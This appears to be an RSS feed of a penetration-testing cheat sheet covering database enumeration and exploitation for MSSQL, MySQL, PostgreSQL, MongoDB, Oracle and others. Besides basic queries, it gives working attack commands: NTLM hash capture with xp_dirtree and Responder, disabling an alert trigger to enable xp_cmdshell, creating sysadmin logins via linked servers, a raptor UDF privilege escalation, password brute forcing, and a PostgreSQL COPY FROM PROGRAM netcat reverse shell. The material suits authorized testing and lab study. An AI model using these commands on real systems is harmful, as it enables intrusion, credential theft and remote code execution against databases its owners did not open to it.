channel.title: Database on TLDRBins
channel.description: Recent content in Database on TLDRBins

item.title: CouchDB
item.description: Basic # Show all databases curl http://localhost:5984/_all_dbs # Show all databases (With Creds) curl http://<USER>:<PASSWORD>@localhost:5984/_all_dbs # Show all docs from database curl http://localhost:5984/<DB_NAME>/_all_docs # Show a entry curl http://localhost:5984/<DB_NAME>/<ID_HASH>

item.title: elasticsearch
item.description: Basic Commands # List indexes curl -s http://example.com:9200/_cat/indices?v # Dump data with index name curl -s -X GET "http://example.com:9200/<INDEX_NAME>/_search?size=100" -H 'Content-Type: application/json' -d' { "query": { "match_all": {} } } ' | jq .

item.title: Graphql
item.description: Visualize Tool graphql-voyager +---------------------------------------------------------------+ | 1. Change Schema -> Introspection -> Copy Introspection Query | | 2. Paste query | | 3. Display | +---------------------------------------------------------------+ Basic Commands # Get fields from schema curl -s 10.10.11.10:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{queryType{name,fields{name,description}}}}"}' | jq . # Get types name curl -s 10.10.11.10:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' | jq . # Get fields of type (e.g. User) curl -s 10.10.11.10:3000/graphql -H "Content-Type: application/json" -d '{"query":"{__type(name:\"User\"){name,fields{name}}}"}' | jq .

item.title: Microsoft Access Database
item.description: Tool sudo apt install mdbtools Basic # Show all tables mdb-tables database.mdb # Show tables with data mdb-tables database.mdb | tr ' ' '\n' | grep . | while read table; do lines=$(mdb-export database.mdb $table | wc -l); if [ $lines -gt 1 ]; then echo "$table: $lines"; fi; done # Dump data from table mdb-export database.mdb <TABLE_NAME>

item.title: MongoDB General
item.description: General Connect to Mongo Database mongo 10.10.11.10:27017 # Connect local with creds and specified database mongo -u <USER> -p <PASSWORD> <DB_NAME> Basic Commands # Show all databases show dbs # Choose database use <DB_NAME> # Show all collections show collections # Show all of the collection db.<COLLECTION_NAME>.find().pretty() # Insert entry into collections db.<COLLECTION_NAME>.insert({"<key>": "<value>"}) # Update an entry (e.g. password of user) db.<COLLECTION_NAME>.update({"username": "user"}, {$set: {"password": "password"}});

item.title: MSSQL Agent Jobs
item.description: 1. Pre-check # List principals SELECT name FROM sys.database_principals; # Check privilege over a principal from current user SELECT entity_name, permission_name FROM fn_my_permissions('<PRINCIPAL>', 'USER'); # Fix : Cannot resolve the collation conflict between "Latin1_General_CI_AI" and "SQL_Latin1_General_CP1_CI_AS" SELECT entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT FROM fn_my_permissions('<PRINCIPAL>', 'USER'); # Check SQL credentials SELECT name, credential_identity FROM sys.credentials; 2. Check proxy account name and permissions # Create a table to store info CREATE TABLE proxies (subsystem_id INT PRIMARY KEY NOT NULL, subsystem_name varchar(255), proxy_id INT, proxy_name varchar(255)); # Insert proxy info into table EXECUTE AS LOGIN='<PRINCIPAL>'; INSERT proxies EXEC msdb.

item.title: MSSQL General
item.description: General Connect to MSSQL DB (From Linux) impacket-mssqlclient '<USER>:<PASSWORD>@<TARGET>' # Without TLS impacket-mssqlclient -windows-auth '<USER>:<PASSWORD>@<TARGET>' Connect to MSSQL DB (From Windows) # With inline query sqlcmd -S <TARGET> -U <USER> -P <PASSWORD> -d <DB_NAME> -Q "SELECT @@version;" Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = '1'; # Check service name and the account authorized to control the service SELECT servicename, service_account FROM sys.

item.title: MSSQL Linked Servers
item.description: Linked Servers Basic Commands Hint: Use double '' to escape ' in mssql # Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE ('select @@version;') at [<LINKED_SERVER>]; # Execute query from linked server to current server EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [<CURRENT_SERVER>]') at [<LINKED_SERVER>]; Abuse #1: Create Admin User from Privilege Linked Server EXECUTE('EXECUTE(''CREATE LOGIN <USER> WITH PASSWORD = ''''<PASSWORD>'''';'') AT [<CURRENT_SERVER>]') AT [<LINKED_SERVER>] EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''<USER>'''', ''''sysadmin'''''') AT [<CURRENT_SERVER>]') AT [<LINKED_SERVER>]

item.title: MSSQL Privilege Escalation
item.description: Abuse #1: Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree '\\10.10.14.10\any\thing'; # Or use master; exec xp_dirtree '\\10.10.14.10\any\thing'; # Or load_file('\\10.10.14.10\any\thing'); Abuse #2: Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Abuse #3: Impersonate sa to run xp_cmdshell execute as login = 'sa'; exec sp_configure 'show advanced options', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; EXEC master.

item.title: Mysql General
item.description: General Connect to mysql Database # Database unknown mysql -u <USER> -h <TARGET> -p<PASSWORD> # Database known mysql -u <USER> -D <DB_NAME> -h <TARGET> -p<PASSWORD> # Execute query inline mysql -u <USER> -D <DB_NAME> -h <TARGET> -p<PASSWORD> -e 'show tables;' Basic Commands # Show all databases show databases; # Choose database use <DB_NAME>; # Show all tables show tables; # Show all entries in table_name select * from <TABLE_NAME>; Update Entry # Update Entry Example UPDATE users set user_type='Administrator' where email='test@example.

item.title: Mysql Privilege Escalation
item.description: Abuse #1: User Defined Function (UDF) # Get the raptor_udf2.c wget https://www.exploit-db.com/raw/1518 -O raptor_udf2.c # Compile the source script gcc -g -c raptor_udf2.c gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc # Copy to target folder cp raptor_udf2.so /dev/shm/raptor_udf2.so # Connect to database as root mysql -u root -p<PASSWORD> mysql # UDF create table foo(line blob); insert into foo values(load_file('/dev/shm/raptor_udf2.so')); # Get plug-in directory show variables like '%plugin%'; +-----------------+---------------------------------------------+ | Variable_name | Value | +-----------------+---------------------------------------------+ | plugin_dir | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ | | plugin_maturity | gamma | +-----------------+---------------------------------------------+ # Copy the plugin_dir value select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.

item.title: Oracle Database
item.description: Tools sqlplus # Install sudo apt install oracle-instantclient-sqlplus # export LD_LIBRARY_PATH export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH} # Check sqlplus -V ODAT (Oracle Database Attacking Tool) Download ODAT # Install sudo apt install odat # Check odat --version Enum # SID enum (You only need one) odat sidguesser -s 10.10.11.10 # User/Password brute force odat passwordguesser -s 10.10.11.10 -d <SID> --accounts-file accounts.txt # Run all checks with creds as sysdba odat all -s 10.

item.title: Postgresql
item.description: General Connect to postgresql Database psql -h 127.0.0.1 -U <USER> -p 5432 -d <DB_NAME> psql postgresql://<USER>:<PASSWORD>@localhost:5432/<DB_NAME> Basic Commands # Show databases \list # Use database \connect <DB_NAME> # Show tables in current database \dt # Dump data from table select * from <TABLE_NAME>; # Insert data into table (e.g) insert into <TABLE_NAME> (username, password, role) values ('user', 'password', 'admin'); # Write text copy (select 'test') to '/var/lib/postgresql/.profile'; # Exit \q RCE # Only superuser CREATE TABLE IF NOT EXISTS exec(string text); COPY exec FROM PROGRAM 'nc -e /bin/bash 10.

item.title: SQLite
item.description: General # Open a db sqlite3 sql.db # Show tables .tables # Show schema of a table .schema <TABLE_NAME> # Show column headers .headers on # Dump data select * from <TABLE_NAME>;
